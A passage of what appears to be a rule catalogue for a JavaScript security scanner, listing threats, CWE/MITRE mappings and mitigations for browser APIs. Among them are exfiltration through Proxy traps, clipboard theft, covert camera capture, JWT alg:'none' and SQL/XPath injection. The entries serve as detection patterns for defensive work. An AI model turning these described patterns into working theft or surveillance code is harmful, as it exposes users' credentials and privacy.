            "Proxy handler.set trap exfiltrates property write values via sendBeacon: object property assignments captured (Proxy-based keylogger)",
            "new Proxy() wraps password/credential/cookie object: sensitive data object intercepted — all operations on it monitored",
            "Proxy target from URL parameter: attacker-controlled proxy target enables arbitrary object interception",
        ],
        "mitigations": [
            "Audit Proxy handler.get and handler.set traps for remote data transmission patterns",
            "Never apply Proxy wrappers to objects containing password/credential/cookie data in untrusted code contexts",
            "Treat any code that combines new Proxy() with fetch/sendBeacon inside trap handlers as high-risk",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "promise_security": {
        "severity": "MEDIUM",
        "short": "Promise Security",
        "cwe": "CWE-312", "owasp": "A02:2021",
        "threats": [
            "Promise.resolve()/new Promise() resolves with password/token/credential: sensitive data propagated through async promise chain to consumers",
            ".then() handler transmits credentials via fetch/sendBeacon: promise resolution triggers immediate credential exfiltration",
            "unhandledrejection event transmitted to remote: rejection reasons including error messages and stack traces exfiltrated",
            "Promise created/resolved with URL parameter value: attacker-controlled promise resolution value injected into async flow",
        ],
        "mitigations": [
            "Never resolve Promises with raw password/token/credential values in plaintext",
            "Audit .then() chains for fetch/sendBeacon calls that include sensitive resolved values",
            "Sanitize unhandledrejection event data before transmitting to error tracking — strip stack traces and internal values",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise", "https://cwe.mitre.org/data/definitions/312.html"],
    },
    "generator_security": {
        "severity": "MEDIUM",
        "short": "Generator / Iterator Security",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "yield expression triggers fetch/sendBeacon: generator used to stream batches of data to remote endpoint on each iteration",
            "yield produces password/token/credential/cookie values: sensitive data streamed via generator to consuming code",
            "while(true) generator continuously yields and fetches: infinite generator loop used for continuous background data exfiltration",
            "Generator function content from URL parameter: attacker-controlled iterator sequence injection",
        ],
        "mitigations": [
            "Audit generator functions that yield sensitive values — generators are often used to abstract away data streaming",
            "Avoid fetch/sendBeacon inside generator yield expressions — this creates a hard-to-audit data stream",
            "Generators with while(true) loops combined with network calls should be treated as background exfiltration candidates",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/function*", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "symbol_security": {
        "severity": "LOW",
        "short": "Symbol / Well-Known Symbol Security",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "[Symbol.toPrimitive] trap transmits data via fetch/sendBeacon: type coercion interception triggers exfiltration on implicit conversion",
            "Object.getOwnPropertySymbols() results transmitted: symbol-keyed property enumeration reveals hidden object structure",
            "[Symbol.toStringTag] sourced from URL parameter: attacker-controlled type tag spoofs object toString() output",
            "Symbol.keyFor() results transmitted to analytics: global Symbol registry probed to fingerprint which libraries are present",
        ],
        "mitigations": [
            "Audit [Symbol.toPrimitive] implementations for remote data transmission inside conversion handlers",
            "Treat Object.getOwnPropertySymbols() results as sensitive — symbol keys may expose private implementation details",
            "Never source [Symbol.toStringTag] from URL parameters — this enables type spoofing attacks",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "weakmap_security": {
        "severity": "LOW",
        "short": "WeakMap / WeakRef / FinalizationRegistry Security",
        "cwe": "CWE-312", "owasp": "A02:2021",
        "threats": [
            "WeakMap.set() stores password/token/credential values: sensitive data cached in WeakMap keyed to DOM elements — survives GC if element is live",
            "WeakRef.deref() result transmitted via fetch/sendBeacon: dereferenced weak reference value exfiltrated to remote",
            "FinalizationRegistry callback transmits data to remote: GC finalization callbacks used to exfiltrate object lifecycle telemetry",
            "new WeakMap() initialized from URL parameter: attacker-controlled initial WeakMap entries",
        ],
        "mitigations": [
            "Avoid storing raw credentials in WeakMap — use encrypted storage or short-lived in-memory buffers",
            "FinalizationRegistry callbacks should never make network requests — they run in unpredictable GC timing",
            "WeakRef.deref() results should be validated as non-null before any network transmission",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WeakMap", "https://cwe.mitre.org/data/definitions/312.html"],
    },
    "json_security": {
        "severity": "HIGH",
        "short": "JSON Security",
        "cwe": "CWE-502", "owasp": "A08:2021",
        "threats": [
            "JSON.parse() parses URL parameter/localStorage content: attacker-controlled JSON enables prototype pollution or object injection",
            "JSON.stringify() serializes password/token/credential for fetch/sendBeacon exfiltration: credentials leaked as JSON",
            "JSON.parse() result passed to eval()/Function()/setTimeout(): parsed JSON content executed as JavaScript code",
            "JSON.parse() reviver function from URL parameter: attacker-controlled deserialization behavior injection",
        ],
        "mitigations": [
            "Never pass unsanitized URL parameters directly to JSON.parse() — validate and sanitize before parsing",
            "Audit JSON.stringify() calls that include credential fields before any network transmission",
            "Never pass JSON.parse() output to eval() or Function() — this enables remote code execution",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON", "https://cwe.mitre.org/data/definitions/502.html"],
    },
    "error_event_security": {
        "severity": "MEDIUM",
        "short": "Error Event Security",
        "cwe": "CWE-209", "owasp": "A05:2021",
        "threats": [
            "error.stack transmitted via fetch/sendBeacon: stack traces reveal internal file paths, function names, and code structure to attackers",
            "window.onerror handler transmits all uncaught errors to remote: complete error context including URLs and line numbers exfiltrated",
            "new Error()/throw includes password/token/credential in message: sensitive data embedded in error messages that may be logged or transmitted",
            "error.message transmitted to analytics: internal API responses and error details leaked to third-party analytics",
        ],
        "mitigations": [
            "Sanitize error data before transmitting — strip stack traces and file paths from client-side error reports",
            "Never include raw credentials in Error message strings — log sanitized error codes instead",
            "Use structured error reporting with allowlisted fields rather than raw error.stack/message transmission",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/ErrorEvent", "https://cwe.mitre.org/data/definitions/209.html"],
    },
    "define_property_security": {
        "severity": "HIGH",
        "short": "Object.defineProperty Security",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "defineProperty() getter transmits to fetch/analytics: every property read operation on the object triggers exfiltration",
            "defineProperty() setter exfiltrates write values via sendBeacon: property assignment captured (equivalent to Proxy-based keylogger)",
            "Object.freeze() on auth/permissions/policy object: verify freeze prevents tampering and is not bypassed via Object.assign/spread",
            "defineProperty() target or descriptor from URL parameter: attacker-controlled property definition enables object manipulation",
        ],
        "mitigations": [
            "Audit Object.defineProperty() getter/setter implementations for network calls — accessors should not make remote requests",
            "Object.freeze() should be combined with COOP headers and CSP to prevent freeze bypass via cross-origin code injection",
            "Never source property names or descriptors from URL parameters",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "storage_event_security": {
        "severity": "HIGH",
        "short": "Storage Event Security",
        "cwe": "CWE-312", "owasp": "A02:2021",
        "threats": [
            "localStorage/sessionStorage.getItem() result transmitted via fetch/sendBeacon: stored data exfiltrated from browser storage",
            "localStorage.setItem() stores password/token/credential in plaintext: sensitive data persisted without encryption in browser storage",
            "storage event listener transmits cross-tab changes to remote: cross-tab storage activity exfiltrated via storage event surveillance",
            "localStorage.setItem() value from URL parameter: attacker-controlled data written to persistent browser storage (storage poisoning)",
        ],
        "mitigations": [
            "Never store raw passwords/tokens/credentials in localStorage/sessionStorage — use HttpOnly cookies or encrypted storage",
            "Audit storage event listeners for network transmission — cross-tab storage surveillance is a privacy violation",
            "Validate URL parameter values before writing to localStorage — URL-injected storage values persist across page loads",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API", "https://cwe.mitre.org/data/definitions/312.html"],
    },
    "regex_security": {
        "severity": "HIGH",
        "short": "Regex Security — ReDoS & Injection",
        "description": "Detects attacker-controlled RegExp construction enabling ReDoS or regex injection, catastrophic backtracking patterns (.*)+/(\\w+)+, .exec()/.match() result exfiltration, and regex result passed to eval() enabling code execution.",
        "cwe": "CWE-1333",
        "mitre": "T1499.001",
        "remediation": [
            "Never construct RegExp from untrusted user input — validate and whitelist patterns",
            "Audit regex patterns for nested quantifiers that cause catastrophic backtracking",
            "Avoid transmitting regex match results to remote endpoints",
            "Never pass regex exec() results to eval() or Function() constructors",
        ],
        "references": ["https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS", "https://cwe.mitre.org/data/definitions/1333.html"],
    },
    "date_security": {
        "severity": "MEDIUM",
        "short": "Date / Time Fingerprinting & Manipulation",
        "description": "Detects getTimezoneOffset() exfiltration for geolocation fingerprinting, toLocaleString()/Intl.DateTimeFormat locale exfil, new Date() from URL parameters enabling date manipulation, and timing oracles around authentication operations.",
        "cwe": "CWE-203",
        "mitre": "T1592",
        "remediation": [
            "Do not transmit timezone offset or locale to third-party analytics without explicit user consent",
            "Validate and sanitize date parameters from URL before passing to new Date()",
            "Avoid using Date.now()/performance.now() timing patterns around authentication that could reveal timing information",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/Date/getTimezoneOffset", "https://cwe.mitre.org/data/definitions/203.html"],
    },
    "intl_security": {
        "severity": "MEDIUM",
        "short": "Intl API Fingerprinting",
        "description": "Detects navigator.languages/language exfiltration revealing user geographic location, Intl.Collator locale-specific sort behavior fingerprinting, Intl.NumberFormat locale fingerprinting, and Intl API locale injection from URL parameters.",
        "cwe": "CWE-359",
        "mitre": "T1592",
        "remediation": [
            "Do not transmit navigator.languages or Intl API locale results to analytics without consent",
            "Treat Intl API results as privacy-sensitive — locale reveals geographic location and language preferences",
            "Validate Intl API locale parameters — never source locale directly from URL parameters",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "map_set_security": {
        "severity": "MEDIUM",
        "short": "Map / Set Credential Exfiltration",
        "description": "Detects new Map() initialized with credentials, .entries() exfiltration of complete Map contents, Map/Set construction from URL parameters, and Map used as a credential collection buffer for exfiltration.",
        "cwe": "CWE-312",
        "mitre": "T1005",
        "remediation": [
            "Never initialize Map with raw credential values — use ephemeral variables instead",
            "Audit .entries()/.values()/.keys() calls for network transmission of sensitive collections",
            "Validate Map/Set constructor arguments — never source initial entries from URL parameters",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map", "https://cwe.mitre.org/data/definitions/312.html"],
    },
    "iterator_protocol_security": {
        "severity": "MEDIUM",
        "short": "Iterator Protocol Data Exfiltration",
        "description": "Detects [Symbol.iterator]/Array.from() result exfiltration, Array.from() from URL parameters enabling sequence injection, iterating over credential-containing objects, and .next() result transmission to remote endpoints.",
        "cwe": "CWE-922",
        "mitre": "T1005",
        "remediation": [
            "Audit Array.from() and spread operations over sensitive iterables for network leakage",
            "Validate Array.from() source — never construct iterable sequences directly from URL parameters",
            "Do not transmit .next() return values to remote endpoints without validation",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Iteration_protocols", "https://cwe.mitre.org/data/definitions/922.html"],
    },
    "function_constructor_security": {
        "severity": "CRITICAL",
        "short": "Function Constructor / eval Code Injection",
        "description": "Detects new Function() and eval() receiving URL parameter input (DOM XSS via dynamic code execution), Function body containing credentials, and setTimeout() with string arguments containing URL parameters (implicit eval).",
        "cwe": "CWE-95",
        "mitre": "T1059.007",
        "remediation": [
            "Never pass URL parameters or user input to new Function() or eval()",
            "Replace eval() with safer alternatives (JSON.parse for data, explicit function calls for logic)",
            "Use function references instead of string arguments in setTimeout()/setInterval()",
            "Implement a strict Content Security Policy that blocks eval (unsafe-eval)",
        ],
        "references": ["https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html", "https://cwe.mitre.org/data/definitions/95.html"],
    },
    "web_components_security": {
        "severity": "HIGH",
        "short": "Web Components Shadow DOM Injection",
        "description": "Detects shadow DOM innerHTML injection from URL parameters, attacker-controlled template cloning, slotted node exfiltration via .assignedNodes(), and open-mode shadow DOM hosting credential-handling components.",
        "cwe": "CWE-79",
        "mitre": "T1059.007",
        "remediation": [
            "Never set shadowRoot.innerHTML from URL parameters — use DOM APIs or sanitize input",
            "Use {mode: 'closed'} for shadow DOM hosting sensitive content to prevent external script access",
            "Audit .assignedNodes()/.assignedElements() for network transmission",
            "Sanitize template content before cloning into the document",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_shadow_DOM", "https://cwe.mitre.org/data/definitions/79.html"],
    },
    "object_spread_security": {
        "severity": "HIGH",
        "short": "Object Spread / Assign Prototype Pollution",
        "description": "Detects Object.assign() merging attacker-controlled URL parameter content enabling prototype pollution, object spread with URL parameter content, Object.entries() exfiltration, and direct Object.assign() targeting Object.prototype/__proto__.",
        "cwe": "CWE-1321",
        "mitre": "T1059.007",
        "remediation": [
            "Never use Object.assign() or spread with unvalidated URL parameter / JSON.parse() content",
            "Use Object.create(null) for merge targets to avoid prototype chain attacks",
            "Validate that merge targets are not Object.prototype or __proto__ before assignment",
            "Avoid transmitting Object.entries() of sensitive objects to remote endpoints",
        ],
        "references": ["https://github.com/nicolo-ribaudo/tc39-proposal-json-parse-with-source", "https://cwe.mitre.org/data/definitions/1321.html"],
    },
    "geolocation_security": {
        "severity": "CRITICAL",
        "short": "Geolocation Covert Tracking",
        "description": "Detects GPS coordinates transmitted without evident consent, continuous location tracking via watchPosition(), geolocation options from URL parameters, and high-accuracy location exfiltration.",
        "cwe": "CWE-359",
        "mitre": "T1430",
        "remediation": [
            "Display explicit consent UI before calling getCurrentPosition() or watchPosition()",
            "Never transmit coordinates to third-party servers without clear user awareness",
            "Prefer coarse location over high-accuracy (enableHighAccuracy:false) when fine precision is not needed",
            "Validate geolocation option parameters — never source accuracy/timeout from URL parameters",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "media_devices_security": {
        "severity": "CRITICAL",
        "short": "Camera / Microphone Covert Capture",
        "description": "Detects getUserMedia() stream transmitted via WebRTC/WebSocket (covert camera/microphone capture), enumerateDevices() hardware fingerprinting, attacker-controlled capture constraints from URL parameters, and MediaStreamTrack device identifier exfiltration.",
        "cwe": "CWE-359",
        "mitre": "T1125",
        "remediation": [
            "Never transmit getUserMedia() streams to unintended third-party endpoints",
            "Display clear visible UI indicator (camera/mic icon) when capturing is active",
            "Do not transmit enumerateDevices() device list to analytics without user consent",
            "Validate getUserMedia() constraints — never source from URL parameters",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "clipboard_advanced_security": {
        "severity": "HIGH",
        "short": "Clipboard Read / Hijack Attack",
        "description": "Detects clipboard.readText() exfiltration silently stealing clipboard contents (passwords, tokens), paste event data theft, clipboard hijacking via writeText() from URL parameters, and writing credentials to the shared clipboard.",
        "cwe": "CWE-200",
        "mitre": "T1115",
        "remediation": [
            "Only call clipboard.readText() in response to explicit user gesture (button click), never silently on page load",
            "Do not transmit paste event clipboardData to remote endpoints",
            "Never write credential values to clipboard without explicit user action",
            "Validate clipboard.writeText() content — never source from URL parameters (prevents clipboard hijacking)",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/Clipboard_API", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "device_orientation_security": {
        "severity": "MEDIUM",
        "short": "Motion Sensor Keystroke Inference",
        "description": "Detects orientation (alpha/beta/gamma) and motion (acceleration/rotationRate) data exfiltration for fingerprinting and gait analysis, and correlation with keypress events enabling side-channel credential theft via accelerometer.",
        "cwe": "CWE-203",
        "mitre": "T1592",
        "remediation": [
            "Do not transmit DeviceOrientationEvent or DeviceMotionEvent data to third-party endpoints",
            "Never correlate motion sensor data with keyboard input events — this enables keystroke inference",
            "Request explicit permission for device orientation/motion access where browsers support it",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/DeviceOrientationEvent", "https://cwe.mitre.org/data/definitions/203.html"],
    },
    "vibration_security": {
        "severity": "MEDIUM",
        "short": "Vibration API Covert Channel",
        "description": "Detects vibration patterns sourced from URL parameters (attacker-controlled), vibration encoding credential data as covert side-channel, looped vibration for data exfiltration, and complex timing patterns for information encoding.",
        "cwe": "CWE-319",
        "mitre": "T1029",
        "remediation": [
            "Validate vibration pattern inputs — never source from URL parameters or user-controlled data",
            "Never use vibration patterns to encode credential or sensitive data (even indirectly)",
            "Avoid looped vibration calls — single short patterns for genuine UX use cases only",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/Vibration_API", "https://cwe.mitre.org/data/definitions/319.html"],
    },
    "broadcast_channel_advanced_security": {
        "severity": "HIGH",
        "short": "Broadcast Channel Credential Broadcast",
        "description": "Detects BroadcastChannel postMessage containing credentials (broadcast to all same-origin tabs), .onmessage relay to remote servers, attacker-controlled channel names from URL parameters, and predictable sensitive channel names (auth/login/token).",
        "cwe": "CWE-319",
        "mitre": "T1040",
        "remediation": [
            "Never broadcast password/token/credential values via BroadcastChannel",
            "Use unpredictable, random channel names for security-sensitive channels",
            "Do not relay BroadcastChannel messages to remote servers",
            "Validate BroadcastChannel name inputs — never source from URL parameters",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API", "https://cwe.mitre.org/data/definitions/319.html"],
    },
    "web_share_security": {
        "severity": "HIGH",
        "short": "Web Share API Data Leakage",
        "description": "Detects navigator.share() transmitting credentials via native share sheet, attacker-controlled share content from URL parameters enabling phishing, file sharing via share sheet, and open redirect via URL field in share payload.",
        "cwe": "CWE-200",
        "mitre": "T1567",
        "remediation": [
            "Never include password/token/API key in navigator.share() payload",
            "Validate share content — never source title/text/url directly from URL parameters",
            "Audit files shared via navigator.share() for sensitive document content",
            "Sanitize the url field in share payloads to prevent open redirect exploitation",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/Web_Share_API", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "idle_detection_security": {
        "severity": "HIGH",
        "short": "Idle Detection User Presence Surveillance",
        "description": "Detects userState/screenState exfiltration (covert presence surveillance), continuous IdleDetector monitoring with remote transmission, idle threshold from URL parameters, and change event relay to remote servers.",
        "cwe": "CWE-359",
        "mitre": "T1592",
        "remediation": [
            "Never transmit IdleDetector userState/screenState to third-party endpoints",
            "Request Idle Detection permission only when genuinely needed for UX",
            "Do not relay IdleDetector change events to remote servers for behavioral profiling",
            "Validate IdleDetector.start() threshold — never source from URL parameters",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/Idle_Detection_API", "https://cwe.mitre.org/data/definitions/359.html"],
    },
    "notification_security": {
        "severity": "HIGH",
        "short": "Notification Credential / Phishing Exposure",
        "description": "Detects Notification body containing credentials (visible on OS lock screen), notification content from URL parameters enabling phishing, notificationclick exfiltration, and service worker showNotification with embedded credentials.",
        "cwe": "CWE-312",
        "mitre": "T1566",
        "remediation": [
            "Never embed password/token/credential values in notification title or body",
            "Validate notification content — never source from URL parameters (prevents notification phishing)",
            "Avoid transmitting notificationclick interaction data to analytics",
            "Use generic notification text — never include account-specific sensitive data",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/Notifications_API", "https://cwe.mitre.org/data/definitions/312.html"],
    },
    "web_authentication_security": {
        "severity": "HIGH",
        "short": "WebAuthn Credential Confusion / Downgrade",
        "description": "Detects WebAuthn attestation data exfiltration, clientDataJSON leakage, attacker-controlled rpId/challenge via URL parameters enabling credential confusion, and WebAuthn downgrade paths to weaker credential types.",
        "cwe": "CWE-295",
        "mitre": "T1556",
        "remediation": [
            "Only send WebAuthn authenticatorData and clientDataJSON to your own relying party server",
            "Never source rpId, challenge, or allowCredentials from URL parameters",
            "Disable password/federated fallback in credentials.get() when WebAuthn is required",
            "Validate that the rpId matches your registered domain before accepting any credential",
        ],
        "references": ["https://www.w3.org/TR/webauthn-2/", "https://cwe.mitre.org/data/definitions/295.html"],
    },
    "credential_api_advanced": {
        "severity": "CRITICAL",
        "short": "Credential Management API Misuse",
        "description": "Detects plaintext password storage via credentials.store(), silent mediation auto-fill triggering unauthorized requests, credential data from URL parameters, and PasswordCredential/FederatedCredential object exfiltration.",
        "cwe": "CWE-522",
        "mitre": "T1555",
        "remediation": [
            "Use credentials.store() only for legitimate credential saving flows, never with URL-sourced data",
            "Avoid mediation:'silent' for sensitive operations — require explicit user interaction",
            "Never serialize PasswordCredential/FederatedCredential objects for transmission to analytics",
            "Validate all credential inputs before calling credentials.store()",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/Credential_Management_API", "https://cwe.mitre.org/data/definitions/522.html"],
    },
    "federated_identity_security": {
        "severity": "CRITICAL",
        "short": "FedCM Token Forwarding / IdP Injection",
        "description": "Detects FedCM IdentityCredential token forwarding to unauthorized endpoints, attacker-controlled identity provider configURL from URL parameters, client ID injection, and static nonce enabling replay attacks.",
        "cwe": "CWE-601",
        "mitre": "T1556",
        "remediation": [
            "Only send FedCM identity tokens to your own authenticated server endpoint",
            "Hardcode the FedCM configURL — never source from URL parameters or user input",
            "Hardcode the FedCM clientId — never allow injection from URL parameters",
            "Use cryptographically random, single-use nonces in every FedCM identity request",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/FedCM_API", "https://cwe.mitre.org/data/definitions/601.html"],
    },
    "magic_link_security": {
        "severity": "HIGH",
        "short": "Magic Link Token Leakage / Weak Entropy",
        "description": "Detects magic link tokens logged to console (visible to extensions), authentication tokens forwarded to analytics/third parties, short low-entropy tokens vulnerable to brute force, and token-from-URL patterns without server validation.",
        "cwe": "CWE-330",
        "mitre": "T1528",
        "remediation": [
            "Never log magic link tokens or email verification tokens to console",
            "Do not transmit authentication tokens to third-party analytics or tracking endpoints",
            "Use cryptographically random tokens of at least 128 bits (32+ hex chars or 22+ base64url chars)",
            "Validate magic link tokens server-side — never trust client-side validation alone",
        ],
        "references": ["https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html", "https://cwe.mitre.org/data/definitions/330.html"],
    },
    "session_fixation_security": {
        "severity": "CRITICAL",
        "short": "Session Fixation / Hijacking",
        "description": "Detects session ID acceptance from URL parameters (session fixation), document.cookie injection from URL parameters, sessionStorage/localStorage session value from URL, and active session token exfiltration via fetch/sendBeacon.",
        "cwe": "CWE-384",
        "mitre": "T1539",
        "remediation": [
            "Never accept session IDs from URL parameters — always generate session IDs server-side",
            "Regenerate session ID after successful authentication (prevents fixation)",
            "Never set document.cookie from URL parameter values",
            "Restrict session cookie transmission — use HttpOnly, Secure, and SameSite=Strict",
        ],
        "references": ["https://owasp.org/www-community/attacks/Session_fixation", "https://cwe.mitre.org/data/definitions/384.html"],
    },
    "account_enumeration_security": {
        "severity": "MEDIUM",
        "short": "Account Enumeration via Error Messages",
        "description": "Detects different error messages for missing user vs wrong password, timing oracles in not-found code paths, real-time username/email existence check endpoints, and registration forms revealing account existence.",
        "cwe": "CWE-204",
        "mitre": "T1589",
        "remediation": [
            "Use identical error messages for 'user not found' and 'wrong password' (generic: 'Invalid credentials')",
            "Ensure consistent response times for existing vs non-existing accounts",
            "Avoid real-time checkEmail()/checkUsername() endpoints that confirm account existence",
            "Rate-limit registration and login endpoints to prevent automated enumeration",
        ],
        "references": ["https://owasp.org/www-community/attacks/Username_Enumeration", "https://cwe.mitre.org/data/definitions/204.html"],
    },
    "same_site_cookie_security": {
        "severity": "HIGH",
        "short": "SameSite Cookie CSRF Misconfiguration",
        "description": "Detects SameSite=None without Secure flag, SameSite=Lax on session/auth cookies (CSRF risk for GET-based mutations), cookie value injection from URL parameters, and session cookies missing explicit SameSite attribute.",
        "cwe": "CWE-352",
        "mitre": "T1059.007",
        "remediation": [
            "Always pair SameSite=None with the Secure flag",
            "Use SameSite=Strict for session and authentication cookies",
            "Never set cookie values from URL parameters",
            "Set SameSite attribute explicitly on all cookies — don't rely on browser defaults",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitevalue", "https://cwe.mitre.org/data/definitions/352.html"],
    },
    "jwt_advanced_security": {
        "severity": "CRITICAL",
        "short": "JWT Algorithm Confusion / Weak Secret",
        "description": "Detects JWT with alg:'none' (signature verification bypass), JWT tokens in URL parameters (logged in access logs), decoded JWT payload logging, JWT payload exfiltration, and JWT signing with short/common secrets vulnerable to brute force.",
        "cwe": "CWE-347",
        "mitre": "T1550",
        "remediation": [
            "Explicitly whitelist allowed algorithms — reject alg:'none' always",
            "Never pass JWT tokens in URL parameters — use Authorization header or httpOnly cookies",
            "Never log decoded JWT payloads to console",
            "Use cryptographically random secrets of at least 256 bits for HMAC, or RSA/EC key pairs for asymmetric signing",
        ],
        "references": ["https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/", "https://cwe.mitre.org/data/definitions/347.html"],
    },
    "cors_credential_security": {
        "severity": "HIGH",
        "short": "CORS Credential Forwarding Attack",
        "description": "Detects credentials:'include' with wildcard origin, fetch to external domains with credentials (session forwarding), attacker-controlled URL with credentials, and XHR withCredentials=true to analytics/CDN endpoints.",
        "cwe": "CWE-346",
        "mitre": "T1563",
        "remediation": [
            "Never use credentials:'include' with dynamic or user-controlled URLs",
            "Restrict cross-origin credential requests to explicitly trusted, hardcoded origins only",
            "Avoid withCredentials=true for requests to analytics or CDN endpoints",
            "Use SameSite=Strict cookies instead of credentials:'include' where possible",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS", "https://cwe.mitre.org/data/definitions/346.html"],
    },
    "token_refresh_security": {
        "severity": "HIGH",
        "short": "Refresh Token Leakage / Insecure Storage",
        "description": "Detects refresh tokens in URL parameters (logged in server access logs), refresh/access tokens in localStorage/sessionStorage (XSS-accessible), refresh token exfiltration via fetch/sendBeacon, and token logging to console.",
        "cwe": "CWE-522",
        "mitre": "T1528",
        "remediation": [
            "Never pass refresh tokens in URL parameters — use secure httpOnly cookies",
            "Store tokens in memory or httpOnly cookies, not localStorage/sessionStorage",
            "Never log access or refresh tokens to console in production",
            "Implement refresh token rotation — invalidate old refresh token after each use",
        ],
        "references": ["https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/", "https://cwe.mitre.org/data/definitions/522.html"],
    },
    "sql_injection_client_security": {
        "severity": "HIGH",
        "short": "Client-Side SQL Injection (Web SQL)",
        "description": "Detects SQL queries constructed from URL parameters or via string concatenation with user input (Web SQL Database / IndexedDB misuse), attacker-controlled database name in openDatabase(), and local database result exfiltration.",
        "cwe": "CWE-89",
        "mitre": "T1059.007",
        "remediation": [
            "Never build SQL queries via string concatenation with user input — use parameterized queries",
            "Never construct SQL from URL parameters — validate and sanitize all inputs",
            "Restrict access to Web SQL Database — avoid storing sensitive data client-side",
            "Do not transmit local database query results to remote endpoints",
        ],
        "references": ["https://owasp.org/www-community/attacks/SQL_Injection", "https://cwe.mitre.org/data/definitions/89.html"],
    },
    "xpath_injection_security": {
        "severity": "HIGH",
        "short": "XPath Injection via User Input",
        "description": "Detects XPath expressions constructed from URL parameters or string concatenation with user input, XPathResult exfiltration, and boolean injection patterns (or '1'='1', nested predicates) in evaluated expressions.",
        "cwe": "CWE-643",
        "mitre": "T1059",
        "remediation": [
            "Never build XPath expressions from user input or URL parameters — use parameterized XPath where available",
            "Validate and allowlist XPath node names and values before use in expressions",
            "Do not transmit XPathResult data to remote analytics endpoints",
            "Sanitize input to prevent XPath metacharacter injection (quotes, brackets, operators)",
        ],
        "references": ["https://owasp.org/www-community/attacks/XPATH_Injection", "https://cwe.mitre.org/data/definitions/643.html"],
    },
    "auth_bypass_pattern_security": {
        "severity": "CRITICAL",
        "short": "Client-Side Authentication Bypass Pattern",
        "description": "Detects auth bypass patterns including isAdmin/role read from URL parameters, authentication state from localStorage/sessionStorage, always-true boolean short-circuits (isAdmin || true), and hardcoded credential comparisons that enable trivial authentication bypass.",
        "cwe": "CWE-287",
        "mitre": "T1078",
        "remediation": [
            "Never derive isAdmin/isAuthenticated/role from URL parameters — validate server-side only",
            "Do not store authentication state in localStorage/sessionStorage — use httpOnly cookies and server sessions",
            "Avoid boolean short-circuit patterns in auth guards — use strict equality checks",
            "Never hardcode credentials or secrets in client-side code",
        ],
        "references": ["https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/", "https://cwe.mitre.org/data/definitions/287.html"],
    },
    "rate_limit_bypass_security": {
        "severity": "HIGH",
        "short": "Client-Side Rate Limit Bypass Pattern",
        "description": "Detects rate limit bypass patterns including X-Forwarded-For/X-Real-IP header values from URL parameters, client-side attempt counters in localStorage/sessionStorage, and rateLimit configuration values from URL parameters that allow attackers to bypass server-side rate limiting.",
        "cwe": "CWE-799",
        "mitre": "T1110",
        "remediation": [
            "Never trust X-Forwarded-For or X-Real-IP headers for rate limiting — use the direct TCP connection IP",
            "Implement rate limiting server-side with server-managed counters, not client storage",
            "Do not configure rate limits from URL parameters — use server-side configuration",
            "Log and alert on repeated requests with modified IP headers",
        ],
        "references": ["https://owasp.org/www-community/attacks/Denial_of_Service", "https://cwe.mitre.org/data/definitions/799.html"],
    },
    "ldap_injection_security": {
        "severity": "HIGH",
        "short": "LDAP Injection via User Input",
        "description": "Detects LDAP query construction from URL parameters, string concatenation with username/email in DN attributes (cn=, ou=), wildcard and boolean operator metacharacters in LDAP filters, and LDAP result exfiltration enabling directory traversal and authentication bypass.",
        "cwe": "CWE-90",
        "mitre": "T1078",
        "remediation": [
            "Use parameterized LDAP queries or escape all special characters (*, (, ), \\, NUL) in user input",
